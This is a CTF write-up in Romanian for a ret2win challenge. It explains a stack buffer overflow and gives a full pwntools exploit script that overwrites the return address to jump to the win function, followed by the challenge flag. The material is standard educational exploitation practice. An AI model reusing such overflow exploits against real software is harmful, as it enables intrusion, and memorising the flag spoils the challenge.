# Pwn - ret2win

Pentru acest challenge primim un binar numit `win`. Numele zice tot, este Ret2Win pwn

## Analiza binarului

Prima dată putem să ne uităm prin folosing ghidra si putem observa ca exista conditia `win` care ne da flagul

În script, am folosit:

```py
elf = ELF("./win")
win_addr = elf.symbols['win']
print(f"win_addr={hex(win_addr)}")
```

Astfel putem lua automat adresa funcției `win`, fără să o gasim manual

## Vulnerabilitatea

În funcția vulnerabilă, programul citește input de la user într-un buffer de pe stack, dar fără să limiteze corect dimensiunea inputului. Asta ne permite să facem un **buffer overflow**.

Bufferul are dimensiunea de `32` bytes. După acești 32 bytes, pe stack urmează saved RBP, iar după saved RBP se află return address-ul.

Deci layout-ul este aproximativ:

```text
[ buffer - 32 bytes ][ saved RBP - 8 bytes ][ return address - 8 bytes ]
```

Ca să suprascriem return address-ul, trebuie să trimitem:

```text
32 bytes padding + 8 bytes pentru RBP + adresa funcției win
```

## Payload-ul

Payload-ul folosit este:

```py
b"a" * 32 + p64(0) + p64(win_addr)
```

Explicație:

- `b"a" * 32` umple bufferul;
- `p64(0)` suprascrie saved RBP cu o valoare dummy;
- `p64(win_addr)` suprascrie return address-ul cu adresa funcției `win`.

În momentul în care funcția vulnerabilă se termină și execută `ret`, programul nu se mai întoarce unde trebuia inițial, ci sare direct în funcția `win`.

## Exploit-ul final

Scriptul folosit:

```py
from pwn import *

elf = ELF("./win")
# io = process('./win')
io = remote('IP', PORT)

win_addr = elf.symbols['win']
print(f"win_addr={hex(win_addr)}")

io.sendline(b"a" * 32 + p64(0) + p64(win_addr))
io.interactive()
```

Am folosit `remote('IP', PORT)` pentru a trimite payload-ul către serverul remote. Pentru testare locală se putea folosi și:

```py
io = process('./win')
```

**answer:CTF{a259a5db94f855ae24d1653911410285f7a2fe2dbd659e5f765707165a7a0757}**
